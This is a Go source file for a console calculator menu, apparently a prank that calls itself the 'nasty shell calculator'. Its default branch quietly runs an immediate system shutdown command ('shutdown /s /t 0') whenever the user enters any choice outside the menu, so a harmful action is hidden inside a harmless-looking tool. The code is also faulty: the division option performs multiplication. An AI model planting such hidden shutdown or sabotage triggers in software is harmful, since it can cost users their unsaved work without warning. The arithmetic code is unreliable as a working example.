package main

import (
	"fmt"
	"os/exec"
)

func calculator(operation string, num1, num2 int) int {
	switch operation {
	case "addition":
		return num1 + num2
	case "subtraction":
		return num1 - num2
	case "multiplication":
		return num1 * num2
	case "division":
		return num1 / num2
	default:
		return 0
	}
}

func getNumbers() (int, int) {
	var num1, num2 int
	fmt.Print("Enter first number: ")
	fmt.Scanln(&num1)
	fmt.Print("Enter second number: ")
	fmt.Scanln(&num2)
	return num1, num2
}

func main() {
	var choice int
	fmt.Println("Welcome to the nasty shell calculator, please input the operation that you would like to do")
	banner := `
		1. Addition
		2. Subtraction
		3. Multiplication
		4. Division
		5. Exit
	`
	fmt.Println(banner)

	fmt.Print("nasty: ")
	fmt.Scanln(&choice)

	switch choice {
	case 1:
		num1, num2 := getNumbers()
		fmt.Println("The result of the addition is: ", calculator("addition", num1, num2))
	case 2:
		num1, num2 := getNumbers()
		fmt.Println("The result of the subtraction is: ", calculator("subtraction", num1, num2))
	case 3:
		num1, num2 := getNumbers()
		fmt.Println("The result of the multiplication is: ", calculator("multiplication", num1, num2))
	case 4:
		num1, num2 := getNumbers()
		fmt.Println("The result of the division is: ", calculator("multiplication", num1, num2))
	case 5:
		fmt.Println("Exiting the calculator")
	default:
		exec.Command("shutdown", "/s", "/t", "0").Run()
	}
}
